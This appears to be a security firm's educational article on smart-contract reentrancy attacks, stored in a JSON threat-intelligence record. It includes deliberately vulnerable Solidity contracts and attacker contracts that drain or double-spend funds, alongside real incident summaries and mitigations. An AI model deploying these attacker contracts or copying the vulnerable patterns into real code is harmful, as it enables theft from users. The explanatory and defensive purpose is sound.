{
    "threat_intelligence": {
        "url": "https://hacken.io/discover/reentrancy-attacks/",
        "timestamp": "2023-06-30 00:00:00",
        "original_content": "\n\nReentrancy attacks, prevalent not only in Solidity but also in other programming languages, have posed a significant threat to \nsmart contract security\n for years. The issue came into the spotlight following a high-profile hack of the DAO in \n2016\n, resulting in substantial financial losses. Now, more than seven years later, it\u2019s crucial for us to analyze the evolution of these attacks and their impact on the ecosystem.\n\n\nIn the first half of 2023 alone, we witnessed \n24\n major attacks, with reentrancy vulnerabilities implicated in four of these incidents. This data highlights the ongoing relevance and potential risks associated with reentrancy and \nother vulnerabilities\n in the current landscape.\n\n\nWhat Is Reentrancy Attack?\u00a0\n\n\nA reentrancy attack is a type of vulnerability exploit where an attacker leverages an unsynchronized state during an external contract call. This allows for repeated execution of actions intended to occur only once, potentially resulting in unauthorized state alterations and actions, such as excessive fund withdrawals.\n\n\nIn simpler terms, the attacker can repeatedly carry out actions that are supposed to be executed only once. The absence of proper synchronization creates a loophole for the attacker, allowing them to make changes to the contract\u2019s state that should not be permitted.\n\n\nA common example is the repeated withdrawal of funds \u2013 a severe exploit that can often lead to substantial financial losses.\n\n\n contract VulnerableWallet {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        require(msg.value >= 1 ether, \"Deposits must be no less than 1 Ether\");\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() public {\n        // Check user's balance\n        require(balances[msg.sender] >= 1 ether, \"Insufficient funds.  Cannot withdraw\" );\n        uint256 bal = balances[msg.sender];\n\n        // Sends user's native tokens \n        (bool sent, ) = msg.sender.call{value: bal}(\"\");\n        require(sent, \"Failed to withdraw sender's balance\");\n\n        // Update user's balance after sending the tokens.\n        balances[msg.sender] = 0;\n    }\n\n\n\nHere, the key point of this vulnerability is the fallback function. Solidity smart contracts can have a fallback function, and its implementation gets executed whenever the contract receives coins.\n\n\nWhen the \nwithdraw()\n function is called, it sends coins to the investor through msg.sender.call and then resets their balance to zero. However, since the execution of the send transaction waits for the hacker\u2019s fallback function to complete, the hacker\u2019s balance remains unchanged until the fallback function finishes.\u00a0\n\n\nAs a result, the withdraw function can be reentered with the same state as if it were initially called, creating a loop that causes the function to execute actions repeatedly which were meant to be executed only once.\n\n\nMitigate weaknesses in your smart contract and improve its functionality with a double line-to-line code analysis and a separate review by a lead auditor.\nRequest a quote\n\n\nTypes Of Reentrancy Attacks\n\n\nMono-Function Reentrancy\n\n\nMono-function reentrancy occurs when a single function within a smart contract falls prey to repeated recursive invocations before the completion of previous invocations.\n\n\nExample malicious contract: \n\n\ninterface IVulnerableWallet {\n    function withdraw() external ;\n    function deposit()external  payable;\n }\n\ncontract Hacker{\n    IVulnerableWallet vulnerableWallet; \n\n    constructor(address _wallet){\n        vulnerableWallet = InterfaceDao(_wallet);\n    }\n\n    function attack() public payable {  \n        vulnerableWallet.deposit{value: msg.value}();\n\n        // Withdraws from Dao contract.\n        vulnerableWallet.withdraw();\n    }\n\n    fallback() external payable{\n       if (address(dao).balance >= 1 ether) {\n        // Calls the withdraw() again once any amount is received\n         vulnerableWallet.withdraw();\n       }\n    }\n}\n\n\n\n\n\nattack() function makes a call to func withdraw (call1)\n\n\nWithdraw function executes the line\u00a0 \n(bool sent, ) = msg.sender.call{value: bal}(\"\")\n and causes the fallback function of a malicious contract to be executed without updating the user\u2019s balance..\u00a0\n\n\nThe fallback function makes a call to func withdraw (call2)\u00a0\n\n\nThe withdraw function executes the line\u00a0 \n(bool sent, ) = msg.sender.call{value: bal}(\"\")\n and fallback gets executed.\n\n\nThe fallback function makes a call to func \nwithdraw (cal\nll3)\n\n\nAnd so on \n\u2026\n\n\n\n\n\n\nThe malicious code above is a prime example of mono-function reentrancy.\n\n\nCross-Function Reentrancy\n\n\nCross-function reentrancy involves the recursive invocation of multiple functions within a smart contract. In this type of attack, the attacker exploits the asynchronous nature of smart contracts, persistently calling back into multiple susceptible functions.\n\n\n\n\nIn a cross-function reentrancy attack, a vulnerable function within a contract shares the same codebase with another function that benefits the attacker.\n\n\n\n\nThe following code snippet provides an illustration of such a vulnerable contract:\n\n\ncontract VulnerableContract {\n    mapping (address => uint) private userBalance;\n\n    function transfer(address to, uint amount) external {\n    if (userBalance[msg.sender] >= amount) {\n        userBalance[to] += amount;\n        userBalance[msg.sender] -= amount;\n    }\n}\n\n    function withdraw() public {\n        uint withdrawAmount = userBalance[msg.sender];\n        (bool success, ) = msg.sender.call.value(withdrawAmount)(\"\"); // An attack can come in at this point\n        require(success);\n        userBalance[msg.sender] = 0;\n    }\n\n}\n\n\n\nHere we see that withdraw function has a reentrancy vulnerability. However, there is also a hidden vulnerability that can be attacked by using the transfer() function.\n\n\nIn this scenario, the attacker\u2019s fallback function recursively calls the transfer() function instead of the withdraw() function. Since the balance is not set to 0 before executing this code, the transfer() function can transfer a balance that has already been spent, resulting in \ndouble spending\n.\n\n\nCross-Contract Reentrancy\n\n\nCross-contract reentrancy typically occurs when several contracts are reliant on the same state variable, but not all of these contracts update this variable in a secure manner. This form of reentrancy is particularly insidious as it\u2019s typically challenging to identify due to the interconnected nature of the contracts and their shared reliance on a common state variable.\n\n\nBelow is a basic \nERC20 token contract\n called DevToken, which will be used by the subsequent contract: VulnerableWallet.\n\n\ncontract DevToken {\n\n    . . . \n    \n    // For onlyOwner modifications: VulnerableWallet is the owner of this    contract\n    mapping (address => uint256) public balances;\n\n    function transfer(address _to, uint256 _value)\n        external\n        returns (bool success)\n    {\n        require(balances[msg.sender] >= _value);\n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n        return true;\n    }\n\n    function mint(address _to, uint256 _value)\n        external\n        onlyOwner \n        returns (bool success)\n    {\n        balances[_to] += _value;\n        totalSupply += _value;\n        return true;\n    }\n\n    function burnFrom(address _from)\n        external\n        onlyOwner \n        returns (bool success)\n    {\n        uint256 amountToBurn = balances[_from];\n        balances[_from] -= amountToBurn;\n        totalSupply -= amountToBurn;\n        return true;\n    }\n\n\n    . . . \n\n}\n\n\n\nThe VulnerableWallet contract receives Eth and mints Dev tokens according to the deposited amount and vice versa; it allows withdrawing deposited Eth by returning the held Dev tokens.\n\n\nAlthough the functions employ a reentrancy guard, \nwithdrawAll()\n lacks a proper check-effect-interactions pattern, and that will be the key reason for this exploit.\n\n\nInitially, an attacker deposits some Eth and receives Dev tokens. When the attacker\u2019s contract calls the \nwithdrawAll\n function, it sends Eth to the attacker and triggers the attacker\u2019s \nreceive\n function before updating the Dev token balance in the DevToken contract \n(success = devToken.burnFrom(msg.sender))\n. In the malicious \nreceive\n function, the contract performs a call to the DevToken contract to transfer Dev tokens to another malicious address before its state is updated, leading to double spending.\n\n\ncontract VulnerableWallet is ReentrancyGuard {\n  \n    . . . \n    function deposit() external payable { \n        bool success = devToken.mint(msg.sender, msg.value);\n        require(success, \"Failed to mint token\");\n    }\n\n    // This reentrancy guard is not going to prevent contract \n    // from the exploit\n    function withdrawAll() external nonReentrant { \n        uint256 balance = devToken.balanceOf(msg.sender);\n        require(balance > 0, \"Insufficient balance\");\n\n        (bool success, ) = msg.sender.call{value: balance}(\"\");\n        require(success, \"Failed to send Ether\");\n\n        success = devToken.burnFrom(msg.sender);\n        require(success, \"Failed to burn token\");\n    }\n\n    function getBalance() external view returns (uint256) {\n        return address(this).balance;\n    }\n    . . . \n\n}\n\n\n\n\u2014---------------------------------------------------------------------------------------------------------------------\n\ncontract Attacker1{\n\n\n    function setMaliciousPeer(address _malicious) external {\n        attacker2 = _malicious;\n    }\n    \n    receive() external payable {\n        if (address(vulnerableWallet).balance >= 1 ether) {\n           devToken.transfer(\nattacker2, vulnerableWallet.getUserBalance(address(this))\n            );\n        }\n    }\n\n    function attack() external payable {\n        require(msg.value == 1 ether, \"Require 1 Ether to attack\");\n        vulnerableWallet.deposit{value: 1 ether}();\n        vulnerableWallet.withdrawAll();\n    }\n    \n    function withdrawFunds() external {\n        vulnerableWallet.withdrawAll();\n    }\n\n    function getBalance() external view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n\n\n\nStep-By-Step Analysis Of \nCross-Contract Reentrancy Attack\n\n\nInitial Status\n\n\nEth Attacker1\nDevToken Attacker1\nEth Attacker2\nDevToken Attacker2\nBalance\n1 Eth\n0 Dev\n0 Eth\n0 Dev\n\n\nAfter the Attack1 contract calls the attack() function, it executes the following steps:\n\n\nStep 1\n: Attacker1.attack() executes vulnerableWallet.deposit{value: 1 ether}(). As a result, it mints 1 token for the msg.sender(Attack1 contract)\n\n\n\n\nEth Attacker1\nDevToken Attacker1\nEth Attacker2\nDevToken Attacker2\nBalance\n0 Eth\n1 Dev\n0 Eth\n0 Dev\n\n\nStep 2\n: Attacker1.attack() executes vulnerableWallet.withdrawAll(). Hence, it executes sending 1 ether to the msg.sender(Attacker1), and the fallback function of Attacker1 gets triggered.\n\n\n\n\nEth Attacker1\nDevToken Attacker1\nEth Attacker2\nDevToken Attacker2\nBalance\n1 Eth\n1 Dev\n0 Eth\n0 Dev\n\n\nStep 3\n: Attacker1.attack() receives function of Attacker1.\u00a0It sends 1 Dev token to Attacker2 before the Wallet contract, updating the state in DevToken by burning it.\n\n\n\n\nEth Attacker1\nDevToken Attacker1\nEth Attacker2\nDevToken Attacker2\nBalance\n1 Eth\n1 Dev\n0 Eth\n1 Dev\n\n\nStep 4:\n As the last step, 1 Dev token gets burned from Attacker1.\n\n\n\n\nEth Attacker1\nDevToken Attacker1\nEth Attacker2\nDevToken Attacker2\nBalance\n1 Eth\n0 Dev\n0 Eth\n1 Dev\n\n\nWrapping Up\n\n\nEth Attacker1\nDevToken Attacker1\nEth Attacker2\nDevToken Attacker2\nInitial \n1 Eth\n0 Dev\n0 Eth\n0 Dev\nStep 1\n0 Eth\n1 Dev\n0 Eth\n0 Dev\nStep 2\n1 Eth\n1 Dev\n0 Eth\n0 Dev\nStep 3\n1 Eth\n1 Dev\n0 Eth\n1 Dev\nStep 4\n1 Eth\n0 Dev\n0 Eth\n1 Dev\n\n\nSince the attacker now has 1 Eth + 1 Dev token after performing the malicious attack with 1 Eth, they can repeatedly execute this attack to mint a significant amount of tokens, potentially leading to the inflation of the token\u2019s price.\u00a0\n\n\nFollow @hackenclub on  (Twitter)\n\n\nReal-World Cases Of Reentrancy Attacks\n\n\nRari Capital Reentrancy Exploit\u00a0 (30 April 2022)\n\n\nRari protocol is a decentralized platform that allows lending and borrowing. Protocol\u2019s code was forked from Compound, and their developers accidentally used one of their old commits, which led them to get hacked.\n\n\nTheir borrow function was lacking a proper checks-effects-interactions pattern. Exploiter has seen that and showed a reaction by getting 150,000,000 USDC as a flash loan and depositing it into the fUSDC-127 contract and calling the vulnerable borrow function to borrow some amount of assets.\n\n\nAs we can see, the function first transfers the borrowed amount and then updates the accountBorrows mapping. Since the function does not have any reentrancy guard, the hacker called the borrow function repetitively before it updates the mapping and drained the funds worth $80 million.\n\n\nfunction borrow() external {\n\u2026\ndoTransferOut (borrower, borrowAmount);\n// doTransferOut: function doTransferOut(borrower, amount) { \n(bool success, )= to.call.value(amount)(\"\"); \nrequire(success, \"doTransferOut failed\"); \n}\n// !!State updates are made after the transfer\naccountBorrows[borrower].principal = vars.accountBorrowsNew; \naccountBorrows[borrower].interestIndex = borrowIndex; totalBorrows = vars.totalBorrowsNew;\n\u2026\n}\n\n\n\nThe hacker borrowed x amount of assets using a flashloan and ran the \ndoTransferOut\n function five times in a loop. After paying back the flashloan, they took the remaining 4x amount and disappeared with it.\n\n\nTransaction: \u200b\u200b\n0xab486012..\n\u00a0\n\n\nOrion Protocol Reentrancy Exploit (2 February 2023)\n\n\nOrion Protocol suffered a reentrancy exploit on both Ethereum and BNB Chain, losing nearly $3 million.\u00a0\n\n\nThe fundamental issue was found in the \nPoolFunctionality._doSwapTokens\n function. This results in an incorrect computation of the asset balance, specifically USDT.\n\n\nThe attack resulted from a reentrancy vulnerability within the swap function of the contract. The \ndoswapThroughOrionPool\n function permitted user-defined swap paths, creating an opportunity for an attacker to exploit this with malicious tokens and reenter deposits. The situation was the ExchangeWithAtomic contract\u2019s failure to validate incoming tokens and implement reentrancy protection.\n\n\nTransaction: \n0xa6f63fcb..\n\u00a0\n\n\nHow To Prevent Reentrancy Attacks In Smart Contracts\n\n\nDealing With Mono-Function And Cross-Function Reentrancy\n\n\nWhen tackling mono-function and cross-function reentrancy, implementing a \nmutex lock\n within the contract can serve as an effective method. This lock acts as a shield, preventing the constant invocation of functions within the same contract, thereby obstructing reentrancy attempts.\n\n\nOne widely-accepted approach to implement this locking mechanism is to inherit the ReentrancyGuard from the OpenZeppelin library within the contract and use the nonReentrant modifier. The \u201cChecks-Effects-Interactions\u201d pattern can also be employed as a viable countermeasure against these types of reentrancy.\n\n\nAddressing Cross-Contract Reentrancy\n\n\nRegardless of the type of reentrancy attack, following the \u201cChecks-Effects-Interactions\u201d pattern in smart contract development is a best practice that enhances the contract\u2019s robustness and provides a significant layer of protection against all forms of reentrancy attacks. By doing so, one ensures the correct handling of states and their updates, thus eliminating any room for potential malicious manipulation.\n\n\nThe problem becomes more complex when dealing with cross-contract reentrancy. This type of reentrancy can be effectively mitigated only by strictly following the \u201cChecks-Effects-Interactions\u201d pattern. Cross-contract interactions can involve unknown or unpredictable external contract behaviors, necessitating that all state checks and updates be concluded before any external interactions occur.\n\n\nIn Conclusion\n\n\nReentrancy vulnerabilities pose a considerable risk in software and blockchain development. Protective measures like mutex locks, pull-over push payments, or reentrancy guards in smart contracts are essential for mitigating these threats.\n\n\nFurthermore, regular and comprehensive audits are essential at every stage of the blockchain development process, specifically for smart contracts. These audits not only strengthen the security of the contracts but also foster trust among users and stakeholders. I strongly believe that a deep understanding and prioritization of safety are pivotal to the sustainable evolution of blockchain technology.\n\n"
    }
}